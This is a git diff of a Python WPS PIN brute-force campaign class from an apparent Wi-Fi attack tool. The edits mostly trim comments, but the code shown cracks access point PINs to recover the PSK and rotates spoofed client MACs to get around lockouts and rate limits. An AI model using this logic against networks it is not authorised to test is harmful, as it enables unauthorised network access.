@@ -46,10 +46,7 @@ class CampaignState:
     p2_index: int = 0
     first_half: Optional[str] = None
     skip_middle: Optional[str] = None  # The middle-3 of the (4+3+checksum) PIN.
-    # First-halves the AP already ruled out (M4 first_half_wrong). Once "1234" is wrong,
-    # every 1234-XXXX candidate is wrong too — skip them (COMMON dups like
-    # 12345670/12345678, and the sweep later re-hitting a COMMON prefix). Persisted, so
-    # resume reconstructs the exact same candidate stream.
+    # First-halves the AP already ruled out (M4 first_half_wrong).
     dead_first_halves: list[str] = field(default_factory=list)
     found_pin: Optional[str] = None
     found_psk: Optional[str] = None
@@ -63,9 +60,7 @@ def _state_path(state_dir, bssid: str) -> Path:
 
 
 def load_run_state(state_dir, bssid: str) -> Optional[CampaignState]:
-    """Read the on-disk .run resume state for a BSSID (no side effects), or None if
-    there's no sweep on file / it's unreadable. Lets Focus surface prior WPS-PIN
-    progress at target-acquisition without spinning up a campaign."""
+    """Read the on-disk .run resume state for a BSSID (no side effects), or None."""
     path = _state_path(state_dir, bssid)
     if not path.exists():
         return None
@@ -77,12 +72,9 @@ def load_run_state(state_dir, bssid: str) -> Optional[CampaignState]:
 
 
 def run_progress_line(state: CampaignState) -> Optional[str]:
-    """One-line WPS-PIN sweep progress (rich markup) for the Focus history, or None
-    when there's nothing to add: a cracked sweep already shows as a saved WPS PSK
-    row, and an unstarted one has no news. Denominators mirror
-    focus_model.wps_status_markup — 11k during the first half, 1k once it's locked."""
+    """One-line WPS-PIN sweep progress (rich markup) for the Focus history, or None."""
     if state.found_pin:
-        return None                        # the _wps_pin.txt row already reports the win
+        return None  # the _wps_pin.txt row already reports the win
     if state.phase == "failed":
         return (f"[bold]WPS PIN[/bold] sweep [red]exhausted[/red] "
                 f"[dim]({state.tested:,} tried · not found)[/dim]")
@@ -95,9 +87,9 @@ def run_progress_line(state: CampaignState) -> Optional[str]:
 
 
 class WpsCampaign(Campaign):
-    _SAVE_EVERY = 16   # checkpoint the .run file every N attempts
-    _MAX_TIMEOUT_RETRIES = 8   # retries of a silent (lost-reply) attempt before conceding
-    _REFUSAL_BAIL = 3   # consecutive active refusals (disassoc / identity-stall) before giving up
+    _SAVE_EVERY = 16          # checkpoint the .run file every N attempts
+    _MAX_TIMEOUT_RETRIES = 8  # retries of a silent (lost-reply) attempt before conceding
+    _REFUSAL_BAIL = 3         # consecutive refusals (disassoc / identity-stall) before giving up
 
     button_id = "btn-wps-pin"
     key = "wps"
@@ -129,23 +121,18 @@ class WpsCampaign(Campaign):
         self.our_mac = random_client_mac()
         self.assoc: Optional[Association] = None
         self.transport: Optional[WlanTransport] = None
-        # TX-ACK: every driver can see the AP's ACKs to us, so we resend a lost frame
-        # instead of guessing.
         self._tx_ack = True
-        self._ack_resends = 1      # max resends of an un-ACKed M-frame
-        # If AP ever ACK'd any of our frames (0 ACKs detection).
-        self._ap_ever_acked = False
+        self._ack_resends = 1        # max resends of an un-ACKed M-frame
+        self._ap_ever_acked = False  # If AP ever ACK'd any of our frames
         self.lock = LockTracker()
 
         self.state = self._load_state()
-        # self.stopped / self._task come from Campaign; only WPS-specific flags here.
         self._paused = False
-        self.status = "idle"      # idle | running | paused | locked | found | failed | error
+        self.status = "idle"  # idle | running | paused | locked | found | failed | error
 
         self._attempt_ewma = 0.5  # seconds/attempt, for ETA
 
         # Suppress consecutive duplicate per-attempt log lines (same pin + same result)
-        # AP repeats responses if we don't respond fast enough (which we don't)
         self._last_attempt_sig: Optional[tuple] = None
 
         # Live lock state for the SECURITY status row's countdown / kind display.
@@ -162,16 +149,12 @@ class WpsCampaign(Campaign):
         self._common_pins = list(dict.fromkeys(oui_pins + list(pinmod.COMMON_PINS)))
 
         # A silent timeout after M4/M6 is only *assumed* wrong (timeout-as-NACK). Once an
-        # AP has proven it sends explicit NACKs, a silent drop is instead a LOST reply — on a
-        # weak link we can miss every one of the AP's M-frame retransmits — so we retry the
-        # same PIN rather than advance past a possibly-correct half. Bounded
-        # (_MAX_TIMEOUT_RETRIES) so a persistently-dropping RX still advances instead of wedging.
+        # AP has proven it sends explicit NACKs, a silent drop is instead a LOST reply
+        # so we retry the same PIN rather than advance past a possibly-correct half.
         self._ap_sends_nacks = False
         self._timeout_retries = 0
-        # An AP that *actively* refuses external-registrar WPS — disassociates us, or engages EAP but
-        # stalls at Identity and never sends M1 — isn't crackable (WPS ext-reg disabled, or it's
-        # 802.1X). Count consecutive refusals and bail rather than soft-lock-churn forever. (Mere
-        # silence is NOT a refusal — that stays infinite-patience, could be a distant AP.)
+        # An AP that *actively* refuses external-registrar WPS isn't crackable (WPS ext-reg disabled
+        # , or it's 802.1X). Count consecutive refusals and bail rather than soft-lock-churn forever.
         self._consecutive_refusals = 0
         self.fail_reason: Optional[str] = None   # terse give-up reason; Focus renders the fail-leaf
         self._last_logged_pin: Optional[str] = None   # log the PIN only when it changes (save width)
@@ -214,9 +197,7 @@ class WpsCampaign(Campaign):
 
     # ---- lifecycle (run()/stop() come from Campaign) ------------------------
     async def teardown(self) -> None:
-        """Exit-driven cleanup (every exit: done / stop / crash) — checkpoint the
-        resume state, drop the kept-alive association + transport, release the
-        active-monitor MAC."""
+        """Exit-driven cleanup (every exit: done / stop / crash)."""
         self._save_state()
         self._teardown()
         await self.iface.clear_fake_mac()
@@ -255,9 +236,7 @@ class WpsCampaign(Campaign):
     async def _ensure_session(self) -> bool:
         if self.assoc is None:
             # Arm fake_mac so the chip HW-ACKs the AP so it stops retransmitting. A no-op return
-            # on a card that can't spoof-ACK (the AP then retransmits and we reply to each). A
-            # FIXED_MAC card returns its silicon MAC (it ACKs only that), so adopt whatever was
-            # armed and associate/inject as it — else the chip never honors the ACKs and storms.
+            # on a card that can't spoof-ACK. A FIXED_MAC card returns its silicon MAC.
             armed = await self.iface.set_fake_mac(self.our_mac, str_to_mac(self.bssid))
             if armed:
                 self.our_mac = str_to_mac(armed)
@@ -273,9 +252,7 @@ class WpsCampaign(Campaign):
         return True
 
     async def _try(self, pin: str) -> AttemptOutcome:
-        """One PIN attempt on a FRESH association. Hardware ground-truth (AirLink): the AP treats a
-        WSC exchange as one-shot per association — a 2nd exchange on a kept-alive assoc is refused
-        pre-oracle with 'Device Password Auth Failure' — so we re-associate per PIN, as reaver does."""
+        """One PIN attempt on a FRESH association."""
         if not await self._ensure_session():
             return AttemptOutcome(PinResult.PROTO_ERROR, pin, detail="assoc failed")
         self.transport.drain()
@@ -304,7 +281,7 @@ class WpsCampaign(Campaign):
         if st.phase == "first_half":
             while st.p1_index < 10000:
                 first4 = f"{st.p1_index:04d}"
-                if first4 in st.dead_first_halves:           # e.g. a COMMON prefix already tried
+                if first4 in st.dead_first_halves:  # e.g. a COMMON prefix already tried
                     st.p1_index += 1
                     continue
                 return pinmod.full_pin(first4, "000")
@@ -326,9 +303,7 @@ class WpsCampaign(Campaign):
     def _apply_outcome(self, pin: str, out: AttemptOutcome) -> None:
         """Advance the keyspace from one successful attempt."""
         st = self.state
-        # WPS_CFG_SETUP_LOCKED (config_error 15): the AP explicitly says WPS is locked — a lock,
-        # never a wrong PIN, whatever the stage. Don't advance the keyspace. (AirLink locks
-        # *silently* via assoc-fail instead; this is the spec path for APs that signal it.)
+        # WPS_CFG_SETUP_LOCKED (config_error 15): the AP explicitly says WPS is locked.
         if out.config_error == 15:
             self.lock.note_setup_locked()
             return
@@ -338,11 +313,9 @@ class WpsCampaign(Campaign):
 
         st.tested += 1
         self.lock.note_progress()
-        # A real M4 oracle result means the AP IS letting our (rotated) client
-        # through. reset the lock ramp so the NEXT soft-lock also skips its wait.
+        # A real M4 oracle result means the AP IS letting our rotated client through.
         self._consecutive_locks_no_progress = 0
 
-        # Verify phase has its own dispatch — it doesn't advance the keyspace.
         if st.phase == "verify":
             self._apply_verify_outcome(pin, out)
             return
@@ -358,9 +331,7 @@ class WpsCampaign(Campaign):
             else:
                 st.p2_index += 1
         elif out.result is PinResult.FIRST_HALF_WRONG:
-            # This first half is dead — record it so we skip any other candidate that
-            # shares it. Only the COMMON phase needs to add (the sweep is monotonic and
-            # never revisits a prefix), which keeps the persisted set to a handful.
+            # This first half is dead
             if st.phase == "common":
                 first4 = pin[:4]
                 if first4 not in st.dead_first_halves:
@@ -437,9 +408,7 @@ class WpsCampaign(Campaign):
 
                 beacon_locked = self._beacon_locked()
                 if self.lock.is_locked(beacon_locked):
-                    # Skip the wait the first soft-lock after every tested++:
-                    # most "soft locks" are just per-MAC rate-limiting, which a
-                    # rotation alone fixes in zero time.
+                    # Skip the wait the first soft-lock after every tested++.
                     skip_wait = (not beacon_locked
                                  and self._consecutive_locks_no_progress == 0)
                     await self._handle_lock(beacon_locked, wait=not skip_wait)
@@ -467,8 +436,7 @@ class WpsCampaign(Campaign):
                 self.state.attempts += 1
 
                 if self.stopped:
-                    break   # Stopped mid-attempt (user Stop / AP switch): bail BEFORE logging or
-                    #         advancing — else the interrupted result leaks into the next session's log.
+                    break   # Stopped mid-attempt (user Stop / AP switch): bail BEFORE logging
 
                 if out.refused:   # AP actively rejected external-registrar WPS — never advances
                     self._consecutive_refusals += 1
@@ -476,7 +444,7 @@ class WpsCampaign(Campaign):
                     self.log(f"{self._attempt_prefix(pin)} → [yellow]{out.detail}[/yellow] "
                              f"[dim bold]\\[#{self._consecutive_refusals}][/dim bold]")
                     if self._consecutive_refusals >= self._REFUSAL_BAIL:
-                        self.status = "failed"        # Focus renders the fail-leaf from fail_reason
+                        self.status = "failed"     # Focus renders the fail-leaf from fail_reason
                         self.fail_reason = f"AP refused before M1 {self._REFUSAL_BAIL}×"
                         self._save_state()
                         break
@@ -517,13 +485,7 @@ class WpsCampaign(Campaign):
         return bool(getattr(ap, "wps_locked", False)) if ap else False
 
     async def _handle_lock(self, beacon_locked: bool, wait: bool = True) -> None:
-        """Mark the lock state, optionally wait it out, then release.
-
-        ``wait=False`` is the adaptive fast path for the first soft-lock since
-        last progress: we just log + rotate, skipping the (often-unnecessary)
-        backoff entirely. Hard locks (beacon WPS-Locked) ALWAYS wait — the AP
-        is saying it won't do WPS at all, no point retrying immediately.
-        """
+        """Mark the lock state, optionally wait it out, then release."""
         # Don't treat a silent AP (0 ACKs) as locked.
         if not beacon_locked and self._tx_ack and not self._ap_ever_acked:
             self.log("[yellow]TX not reaching AP[/yellow] [dim]— retrying, no backoff[/dim]")
@@ -531,9 +493,8 @@ class WpsCampaign(Campaign):
             self._last_attempt_sig = None
             return
         self.lock.begin_lock()
-        # "hard" = AP itself advertises WPS locked in its beacons (matches the 🔒
-        # in the SECURITY row). "soft" = our backoff after N pre-oracle rejects;
-        # AP isn't beaconing locked, it's just refusing rapid retries.
+        # "hard" = AP itself advertises WPS locked in its beacons
+        # "soft" = our backoff after N pre-oracle rejects.
         self._lock_kind = "hard" if beacon_locked else "soft"
         trigger = "beacon" if beacon_locked else f"{self.lock.strikes} strikes"
         if wait:
@@ -571,10 +532,7 @@ class WpsCampaign(Campaign):
         return max(0.0, self._lock_end_at - time.monotonic())
 
     def _should_retry_lost_reply(self, pin: str, out: AttemptOutcome) -> bool:
-        """True if this half-wrong was inferred from *silence* on an AP we know sends
-        explicit NACKs — i.e. a lost reply, not a real rejection. Retry the same PIN
-        (caller rotates the MAC) instead of advancing. Bounded by _MAX_TIMEOUT_RETRIES so
-        a persistently-dropping RX eventually concedes rather than wedging on one PIN."""
+        """True if this half-wrong was inferred from *silence* on an AP we know NACKs."""
         if out.config_error is not None:
             self._ap_sends_nacks = True   # this AP answers wrong guesses with a real NACK
         silent_half_wrong = (
@@ -614,8 +572,7 @@ class WpsCampaign(Campaign):
         logger.debug("WPS rotated MAC %s -> %s", old.hex(), self.our_mac.hex())
 
     def _attempt_prefix(self, pin: str) -> str:
-        """Colour the PIN when it changed since the last logged line, else a short continuation
-        marker aligned under it — most of a WPS log line's width is the 8-digit PIN + 'trying'."""
+        """Colour the PIN when it changed since the last logged line."""
         if pin == self._last_logged_pin:
             return "[dim]     ↳[/dim]"
         self._last_logged_pin = pin
@@ -623,15 +580,9 @@ class WpsCampaign(Campaign):
 
     def _log_attempt(self, pin: str, out: AttemptOutcome,
                      prev_first_half: Optional[str]) -> None:
-        """One concise line per PIN attempt — what was tested, what came back,
-        and how deep the exchange got ([Mx] marker). SUCCESS is intentionally
-        silent here; the UI closes the campaign tree with bold cyan PIN + green
-        PSK leaves via _stop_wps_pin.
-        """
+        """One concise line per PIN attempt."""
         if out.result is PinResult.SUCCESS:
             return
-        # First-half just confirmed gets a forced log even if sig duplicates —
-        # it's a real state change, the next attempt will have a new pin anyway.
         first_half_just_confirmed = (
             self.state.first_half is not None and prev_first_half is None)
 
